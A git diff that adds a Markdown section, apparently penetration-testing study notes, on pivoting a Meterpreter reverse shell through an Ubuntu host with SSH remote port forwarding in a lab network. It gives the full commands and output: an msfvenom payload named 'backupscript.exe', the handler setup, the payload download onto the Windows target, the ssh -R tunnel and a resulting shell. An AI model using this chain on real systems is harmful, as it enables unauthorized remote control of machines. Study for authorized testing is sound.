@@ -770,3 +770,231 @@ The `xfreerdp` command will require an RDP certificate to be accepted before suc
 </details>
 
 </details>
+
+---
+
+<details>
+<summary><h1>🔄 Remote/Reverse Port Forwarding with SSH</h2></summary>
+
+We’ve already covered:
+* **Local port forwarding (`-L`)** — SSH listens on a port on your machine and forwards connections to a service reachable from the remote host. This is used to *bring a remote service to your local host*.
+* **Dynamic port forwarding (`-D`)** — SSH creates a local SOCKS proxy so you can route arbitrary connections through a pivot host and reach networks that your attack machine has no direct route to.
+Now, we will cover:
+* **Remote forwarding (`-R`)** — remote port → local service (expose local to remote).
+
+Sometimes you need to expose a service running on your local machine to the remote network. This is the inverse of local forwarding: you make the remote (pivot) host listen on a port and forward incoming connections back to a service on your machine.
+
+```mermaid
+flowchart LR
+  %% Nodes principales
+  ATT["<b>Attack Host</b><br/><br/>10.10.15.5<br/><br/>💻<br/><br/>"]
+  
+  VIC1["<b>Victim Server (Ubuntu)</b><br/><br/>10.129.15.50<br/>172.16.5.129<br/><br/>🗄️"]
+  
+  QUESTION["<br/>❓<br/><br/><b>No route to<br/>attack host</b><br/><br/>"]
+  
+  VIC2["<b>Victim Server (Windows A)</b><br/><br/>172.16.5.19<br/><br/><b>RDP Service</b><br/><br/>🗄️"]
+  
+  %% Connections
+  ATT ==>|"<b>SSH: 0.0.0.0:22</b>"| VIC1
+  VIC1 ==>|" "| QUESTION
+  QUESTION ==>|" "| VIC2
+  VIC2 -.->|" "| ATT
+  
+  %% Styling
+  style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
+  style VIC1 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
+  style VIC2 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
+  style QUESTION fill:#2d3e50,stroke:#ff6b6b,stroke-width:3px,color:#fff
+  
+  linkStyle 0 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
+  linkStyle 1 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
+  linkStyle 2 stroke:#9ACD32,stroke-width:4px,stroke-dasharray:5
+  linkStyle 3 stroke:#9ACD32,stroke-width:4px,stroke-dasharray:5
+```
+
+<details>
+<summary><h2>Scenario</h2></summary>
+
+**Reverse shell blocked by routing**
+
+You try to get a reverse shell from Windows A (172.16.5.19) back to your attack host (10.10.15.5 / 10.129.x.x), but the connection fails.
+**Reason:** Windows A can only route outbound traffic inside 172.16.5.0/23. It has no route to the network where your attack host lives, so a direct reverse connection cannot reach your listener.
+
+**Why RDP alone may be insufficient**
+
+* RDP gives interactive access but can be limited (clipboard/file transfer disabled, restricted built-in tools).
+* Tasks that need deeper interaction or privileged tooling (file upload/download, process injection, API calls, Meterpreter features) often require a proper reverse shell or agent.
+* Without network routing between Windows A and your attack host, a reverse shell cannot be established directly.
+
+**Pivot concept (high-level solution)**
+
+Use a pivot host that has connectivity to both networks. In this scenario the Ubuntu server is that pivot: it can reach both the Windows target (172.16.5.19) and the network where your attack host/listener is reachable.
+* Configure the payload on Windows so its reverse connection targets the pivot host IP (the pivot acts as the rendezvous point).
+* On the pivot host, forward a remote port to your attack host’s listener so that reverse traffic arriving at the pivot is relayed to your Metasploit listener.
+
+**Concrete example**
+
+1. Windows A outbound is restricted to 172.16.5.0/23.  
+2. Pivot host IP on that internal net: `172.16.5.129` (Ubuntu).  
+3. Configure the Meterpreter HTTPS payload to connect to **LHOST** = `172.16.5.129`.  
+4. On the pivot, forward port 8080 to your attack host’s Metasploit listener on port `8000`.  
+    * **Result:** Windows A connects to 172.16.5.129:8080 → pivot forwards to your attack host `:8000` → Metasploit accepts the session.
+
+**When to use this approach**
+
+* Reverse shells must traverse disjoint networks with no direct route.  
+* RDP is insufficient for the actions you need (file transfer, API-level enumeration, payload execution).  
+* You have a compromised/accessible host that can act as a reliable pivot between networks.
+
+</details>
+
+<details>
+<summary><h2>Steps</h2></summary>
+
+**1. Creating a Windows Payload with msfvenom**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+```
+```bash
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 712 bytes
+Final size of exe file: 7168 bytes
+Saved as: backupscript.exe
+```
+
+**2. Configuring & Starting the multi/handler**
+
+```bash
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8000
+msf6 exploit(multi/handler) > run
+```
+```bash
+[*] Started HTTPS reverse handler on https://0.0.0.0:8000
+```
+
+Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.
+
+**3. Transferring Payload to Pivot Host**
+
+```bash
+scp backupscript.exe ubuntu@10.129.15.50:~/
+```
+```bash
+backupscript.exe                                   100% 7168    65.4KB/s   00:00
+```
+
+After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.
+
+**4. Starting Python3 Webserver on Pivot Host**
+
+```bash
+python3 -m http.server 8123
+```
+
+**5. Downloading Payload on the Windows Target**
+
+We can download this backupscript.exe on the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
+
+```CMD
+Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+```
+
+Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000.
+
+**6. Using SSH -R**
+
+```bash
+ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
+```
+
+After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
+
+**7. Viewing the Logs from the Pivot**
+
+```bash
+ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
+debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
+debug1: channel 1: new [172.16.5.19]
+debug1: confirm forwarded-tcpip
+debug1: channel 0: free: 172.16.5.19, nchannels 2
+debug1: channel 1: connected to 0.0.0.0 port 8000
+debug1: channel 1: free: 172.16.5.19, nchannels 1
+debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
+debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
+debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
+debug1: channel 0: new [172.16.5.19]
+debug1: confirm forwarded-tcpip
+debug1: channel 0: connected to 0.0.0.0 port 8000
+```
+
+If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.
+
+**8. Meterpreter Session Established**
+
+```bash
+[*] Started HTTPS reverse handler on https://0.0.0.0:8000
+[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
+[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
+[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500
+
+meterpreter >
+```
+```bash
+meterpreter > shell
+```
+```bash
+Process 3236 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>
+```
+
+Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) since we are receiving the connection over the local SSH socket, which created an outbound connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.
+
+The below graphical representation provides an alternative way to understand this technique.
+
+```mermaid
+flowchart LR
+  %% Attack Host
+  ATT["<b>Attack Host</b><br/><br/>10.10.15.5<br/><br/>💻<br/><br/><b>MSFConsole: 8000</b>"]
+  
+  %% SSH Connection Info
+  SSH["<b>SSH 0.0.0.0:22</b><br/><br/><b>Listens on port 8080,</b><br/><b>Forwards 8080</b><br/><b>to SSH</b>"]
+  
+  %% Victim Server Ubuntu
+  VIC1["<b>Victim Server (Ubuntu)</b><br/><br/>10.129.15.50<br/>172.16.5.129<br/><br/>🗄️"]
+  
+  %% Victim Server Windows A
+  VIC2["<b>Victim Server (Windows A)</b><br/><br/>172.16.5.19<br/><br/><b>RDP Service</b><br/><br/>🗄️"]
+  
+  %% Connections
+  ATT ==>|"<b>Forward remote<br/>port 8080 to local<br/>port 8000</b>"| SSH
+  SSH <-->|"<b>SSH Tunnel</b>"| VIC1
+  VIC1 ==>|"<b>Reverse HTTPS Shell</b>"| VIC2
+  VIC2 -.->|"<b>Reverse shell<br/>forwarded to port<br/>8000 (msfconsole)</b>"| ATT
+  
+  %% Styling
+  style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
+  style SSH fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+  style VIC1 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
+  style VIC2 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
+  
+  linkStyle 0 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
+  linkStyle 1 stroke:#9ACD32,stroke-width:4px
+  linkStyle 2 stroke:#ff0000,stroke-width:4px
+  linkStyle 3 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
+```
+
+</details>
+
+</details>
